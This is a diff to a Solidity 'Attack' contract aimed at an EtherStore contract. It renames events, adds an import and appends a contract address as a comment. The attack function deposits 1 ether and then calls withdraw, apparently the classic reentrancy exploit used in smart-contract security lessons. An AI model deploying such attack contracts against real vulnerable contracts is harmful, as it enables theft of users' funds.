@@ -1,6 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.13;
 
+import "./EtherStore.sol";
 
 contract Attack {
 
@@ -26,11 +27,11 @@ contract Attack {
     }
 
     function attack() external payable {
-        emit withdrawCalled(msg.sender);
+        emit attackCalled(msg.sender);
         require(msg.value >= 1 ether);
         etherStore.deposit{value: 1 ether}();
         etherStore.withdraw();
-        emit withdrawSuccess(msg.sender);
+        emit attackSuccess(msg.sender);
     }
 
     // Helper function to check the balance of this contract
@@ -38,3 +39,5 @@ contract Attack {
         return address(this).balance;
     }
 }
+
+//0x329d9ad6c0dF982f9204617660B47499ED17582C
